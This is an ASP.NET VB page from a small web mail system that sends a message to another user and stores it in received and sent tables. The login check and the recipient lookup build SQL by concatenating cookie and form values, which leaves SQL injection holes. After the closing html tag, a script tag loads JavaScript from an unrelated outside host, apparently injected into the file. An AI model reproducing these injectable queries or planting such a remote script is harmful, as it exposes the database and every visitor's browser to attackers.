<%@ Page Language="VB" %>
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim FunctionClass As New FunctionClass
    Dim dr As Data.OleDb.OleDbDataReader
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        dbconn.Create()
        conn = dbconn.GetConn()
        cmd = conn.CreateCommand
        Dim username As String
        Dim rndtext As String
        If Request.Cookies("nbmailsystem") Is Nothing Then
            Exit Sub
        End If
        If Request.Cookies("nbmailsystem")("username") Is Nothing Or Request.Cookies("nbmailsystem")("rndtext") Is Nothing Then
            Response.Redirect("index.aspx")
        End If
        username = Trim(Request.Cookies("nbmailsystem")("username").ToString())
        rndtext = Trim(Request.Cookies("nbmailsystem")("rndtext").ToString())
        cmd.CommandText = "select count(*) as count001 from [userinfo] where [username]='" & username & "' and [rndtext]='" & rndtext & "'"
        dr = cmd.ExecuteReader()
        dr.Read()
        If dr("count001") <= 0 Then
            dr.Close()
            Response.Redirect("index.aspx")
        End If
        dr.Close()
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub

    Protected Sub Button_Send_Click(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim a As String
        Dim b As String
        Dim c As String
        Dim i As Integer
        Dim da As New Data.OleDb.OleDbDataAdapter("select * from [ReceivedBox]", conn)
        Dim oc As New Data.OleDb.OleDbCommandBuilder(da)
        Dim da1 As New Data.OleDb.OleDbDataAdapter("select * from [SendBox]", conn)
        Dim oc1 As New Data.OleDb.OleDbCommandBuilder(da1)
        Dim dt As New Data.DataTable
        oc.QuotePrefix = "["
        oc.QuoteSuffix = "]"
        oc1.QuotePrefix = "["
        oc1.QuoteSuffix = "]"
        a = Trim(Text_Received_Username.Text)
        b = Trim(Text_Subject.Text)
        c = Trim(Text_Body.Text)
        If a = "" Or b = "" Or c = "" Then
            MsgBox("信息不完整！", 4096, "错误")
        Else
            cmd.CommandText = "select * from UserInfo where username='" & a & "'"
            dr = cmd.ExecuteReader()
            If dr.HasRows() = False Then
                MsgBox("收件人不存在！", 4096, "错误")
                dr.Close()
            Else
                dr.Close()
                da.Fill(dt)
                dt.Rows.Add(dt.NewRow())
                dt.Rows(dt.Rows.Count - 1).Item(1) = Request.Cookies("nbmailsystem")("username").ToString()
                dt.Rows(dt.Rows.Count - 1).Item(2) = a
                dt.Rows(dt.Rows.Count - 1).Item(3) = b
                dt.Rows(dt.Rows.Count - 1).Item(4) = c
                dt.Rows(dt.Rows.Count - 1).Item(5) = Now()
                dt.Rows(dt.Rows.Count - 1).Item(6) = False
                da.Update(dt)
                da = Nothing
                dt.Clear()
                da1.Fill(dt)
                dt.Rows.Add(dt.NewRow())
                dt.Rows(dt.Rows.Count - 1).Item(1) = Request.Cookies("nbmailsystem")("username").ToString()
                dt.Rows(dt.Rows.Count - 1).Item(2) = a
                dt.Rows(dt.Rows.Count - 1).Item(3) = b
                dt.Rows(dt.Rows.Count - 1).Item(4) = c
                dt.Rows(dt.Rows.Count - 1).Item(5) = Now()
                da1.Update(dt)
                da1 = Nothing
                dt.Clear()
		Response.Redirect("sendmailsucc.aspx")
            End If
        End If
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" /> 
    <title>
    </title>
</head>
<body text="#0000">
    <form id="form1" runat="server">
        &nbsp;&nbsp;&nbsp;&nbsp;<asp:Label ID="Label1" runat="server" Text="收件人："></asp:Label>
        <asp:TextBox ID="Text_Received_Username" runat="server" Width="392px"></asp:TextBox>
        <br />
        <br />
        <asp:Label ID="Label2" runat="server" Text="邮件标题："></asp:Label>
        <asp:TextBox ID="Text_Subject" runat="server" Width="392px"></asp:TextBox>
        <br />
        <br />
        <asp:Label ID="Label3" runat="server" Text="邮件内容："></asp:Label><br />
        &nbsp;<asp:TextBox ID="Text_Body" runat="server" Height="224px" TextMode="MultiLine"
            Width="472px"></asp:TextBox>
        <br />
        <br />
        <asp:Button ID="Button_Send" runat="server" Text="发送" OnClick="Button_Send_Click" />
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>